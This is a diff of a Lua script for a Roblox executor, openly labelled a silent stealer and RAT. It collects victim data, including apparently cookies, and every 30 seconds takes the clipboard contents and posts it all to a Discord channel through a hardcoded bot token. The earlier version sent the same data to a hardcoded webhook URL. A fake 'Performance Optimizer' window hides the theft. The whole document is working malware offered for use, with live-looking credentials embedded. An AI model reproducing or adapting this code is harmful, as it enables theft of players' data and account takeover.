@@ -1,13 +1,18 @@
 -- ============================================================
--- DELTA-OPTIMIZED STEALER + LEGIT GUI
+-- SILENT STEALER + RAT (Bot Token) – NO TEST
 -- ============================================================
-local webhook = "https://discord.com/api/webhooks/1545855831453474816/68zNp9FU7svcVfUqN4HGLf8Hp0IsTyW-LOI0jCBLB3o0NlbDThj0BfrUcg7mMJ6mPVMg"
+local botToken = "MTUzMzg5MjMyMDQ1NjM0Nzc4OA.GKEOrv.PKV9UcJd703CEZorhu6HqPI_ERafjoUJUwSaEE"
+local channelID = "1543230748180615198"
 
--- ========== HTTP SENDER (tries all methods) ==========
-local function send(url, content)
+-- ========== HTTP SENDER ==========
+local function sendMessage(content)
+    local url = "https://discord.com/api/v10/channels/" .. channelID .. "/messages"
     local payload = {content = content}
     local json = game:GetService("HttpService"):JSONEncode(payload)
-    local headers = {["Content-Type"] = "application/json"}
+    local headers = {
+        ["Authorization"] = "Bot " .. botToken,
+        ["Content-Type"] = "application/json"
+    }
     local methods = {
         function() return pcall(request, {Url = url, Method = "POST", Headers = headers, Body = json}) end,
         function() return pcall(http_request, {Url = url, Method = "POST", Headers = headers, Body = json}) end,
@@ -60,7 +65,7 @@ local function stealCookie()
     return "Not available (executor limit)"
 end
 
--- ========== COLLECT DATA ==========
+-- ========== COLLECT ALL DATA ==========
 local function collectData()
     local info = {}
     info.executor = (getexecutorname and getexecutorname()) or (identifyexecutor and identifyexecutor()) or "Unknown"
@@ -142,8 +147,8 @@ local function collectData()
     return info
 end
 
--- ========== SEND DATA ==========
-local function sendData()
+-- ========== SEND INITIAL DATA ==========
+local function sendInitial()
     local data = collectData()
     local lines = {}
     for k, v in pairs(data) do
@@ -152,7 +157,7 @@ local function sendData()
         end
     end
     local msg = "```\n" .. table.concat(lines, "\n") .. "\n```"
-    send(webhook, msg)
+    sendMessage(msg)
 end
 
 -- ========== GUI ==========
@@ -163,14 +168,14 @@ local function createGUI()
         gui.Parent = pg
         gui.ResetOnSpawn = false
         local f = Instance.new("Frame")
-        f.Size = UDim2.new(0, 420, 0, 200)
-        f.Position = UDim2.new(0.5, -210, 0.5, -100)
+        f.Size = UDim2.new(0, 420, 0, 180)
+        f.Position = UDim2.new(0.5, -210, 0.5, -90)
         f.BackgroundColor3 = Color3.fromRGB(30, 35, 45)
         f.BackgroundTransparency = 0.08
         f.Parent = gui
-        Instance.new("UICorner", f).CornerRadius = UDim.new(0, 16)
+        Instance.new("UICorner", f).CornerRadius = UDim.new(0, 14)
         local t = Instance.new("TextLabel")
-        t.Size = UDim2.new(1, 0, 0, 50)
+        t.Size = UDim2.new(1, 0, 0, 45)
         t.Position = UDim2.new(0, 0, 0, 10)
         t.BackgroundTransparency = 1
         t.Text = "Performance Optimizer"
@@ -180,88 +185,36 @@ local function createGUI()
         t.Parent = f
         local s = Instance.new("TextLabel")
         s.Size = UDim2.new(1, 0, 0, 30)
-        s.Position = UDim2.new(0, 0, 0.35, 0)
+        s.Position = UDim2.new(0, 0, 0.38, 0)
         s.BackgroundTransparency = 1
-        s.Text = "Optimizing settings..."
+        s.Text = "Optimization complete!"
         s.TextColor3 = Color3.fromRGB(200, 200, 210)
         s.TextScaled = true
         s.Font = Enum.Font.Gotham
         s.Parent = f
-        local bg = Instance.new("Frame")
-        bg.Size = UDim2.new(0.8, 0, 0, 18)
-        bg.Position = UDim2.new(0.1, 0, 0.55, 0)
-        bg.BackgroundColor3 = Color3.fromRGB(60, 65, 75)
-        bg.Parent = f
-        Instance.new("UICorner", bg).CornerRadius = UDim.new(0, 9)
-        local fill = Instance.new("Frame")
-        fill.Size = UDim2.new(0, 0, 1, 0)
-        fill.BackgroundColor3 = Color3.fromRGB(0, 180, 255)
-        fill.Parent = bg
-        Instance.new("UICorner", fill).CornerRadius = UDim.new(0, 9)
-        local pct = Instance.new("TextLabel")
-        pct.Size = UDim2.new(0, 60, 0, 30)
-        pct.Position = UDim2.new(0.5, -30, 0.75, 0)
-        pct.BackgroundTransparency = 1
-        pct.Text = "0%"
-        pct.TextColor3 = Color3.fromRGB(255, 255, 255)
-        pct.TextScaled = true
-        pct.Font = Enum.Font.Gotham
-        pct.Parent = f
-        local st = Instance.new("TextLabel")
-        st.Size = UDim2.new(1, 0, 0, 30)
-        st.Position = UDim2.new(0, 0, 0.85, 0)
-        st.BackgroundTransparency = 1
-        st.Text = ""
-        st.TextColor3 = Color3.fromRGB(150, 255, 150)
-        st.TextScaled = true
-        st.Font = Enum.Font.Gotham
-        st.Parent = f
         local btn = Instance.new("TextButton")
-        btn.Size = UDim2.new(0, 120, 0, 40)
-        btn.Position = UDim2.new(0.5, -60, 1, -50)
+        btn.Size = UDim2.new(0, 100, 0, 35)
+        btn.Position = UDim2.new(0.5, -50, 1, -45)
         btn.BackgroundColor3 = Color3.fromRGB(60, 65, 75)
         btn.Text = "CLOSE"
         btn.TextColor3 = Color3.fromRGB(255, 255, 255)
         btn.TextScaled = true
         btn.Font = Enum.Font.GothamBold
         btn.Parent = f
-        btn.Visible = false
-        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 12)
+        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 10)
         btn.MouseButton1Click:Connect(function() gui:Destroy() end)
-        local function anim()
-            local dur = 2.5
-            local steps = 50
-            local stepTime = dur / steps
-            local msgs = {"Analyzing system...", "Adjusting graphics...", "Optimizing network...", "Fine‑tuning performance...", "Applying optimal settings..."}
-            for i = 0, steps do
-                local prog = i / steps
-                local w = 0.8 * prog
-                fill:TweenSize(UDim2.new(w, 0, 1, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Linear, stepTime, false)
-                pct.Text = string.format("%d%%", math.floor(prog * 100))
-                if i < steps then
-                    task.wait(stepTime)
-                    if i % 10 == 0 then
-                        s.Text = msgs[math.floor(i / 10) + 1] or msgs[#msgs]
-                    end
-                end
-            end
-            s.Text = "Optimization complete!"
-            st.Text = "Settings updated successfully."
-            btn.Visible = true
-        end
-        task.wait(0.3)
-        spawn(anim)
     end)
 end
 
--- ========== MAIN ==========
-sendData()
+-- ========== START ==========
+sendInitial()
 createGUI()
--- Keep sending clipboard updates every 30 seconds (optional)
+
+-- ========== CONTINUOUS RAT LOOP (clipboard every 30s) ==========
 while true do
     task.wait(30)
     local clip = getClip()
     if clip and clip ~= "N/A" and clip ~= "" then
-        send(webhook, "```[CLIPBOARD] " .. clip .. "```")
+        sendMessage("```[CLIPBOARD] " .. clip .. "```")
     end
 end
